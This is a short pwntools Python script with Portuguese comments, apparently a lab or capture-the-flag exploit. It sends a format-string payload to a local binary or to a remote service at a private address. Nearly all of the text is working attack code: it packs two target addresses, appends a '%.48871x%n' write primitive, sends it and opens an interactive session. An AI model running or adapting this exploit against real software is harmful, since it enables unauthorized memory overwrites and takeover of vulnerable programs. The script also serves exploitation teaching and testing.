from pwn import *

#!/usr/bin/python3
import sys

LOCAL = False

if LOCAL:
    p = process("./program")
    """
    O pause() para este script e permite-te usar o gdb para dar attach ao processo
    Para dar attach ao processo tens de obter o pid do processo a partir do output deste programa. 
    (Exemplo: Starting local process './program': pid 9717 - O pid seria  9717) 
    Depois correr o gdb de forma a dar attach. 
    (Exemplo: `$ gdb attach 9717` )
    Ao dar attach ao processo com o gdb, o programa para na instrução onde estava a correr.
    Para continuar a execução do programa deves no gdb  enviar o comando "continue" e dar enter no script da exploit.
    """
    pause()
else:    
    p = remote('10.227.243.188', 4005)

# Initialize the content array
N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0x1845d054
content[0:4]  =  (number).to_bytes(4,byteorder='little')

number  = 0x0804c034
content[4:8]  =  (number).to_bytes(4,byteorder='little')

s = "%.48871x" + "%n"

fmt  = (s).encode('latin-1')
content[8:8+len(fmt)] = fmt

p.recvuntil(b"here...")
p.sendline(bytes(content))
p.interactive()

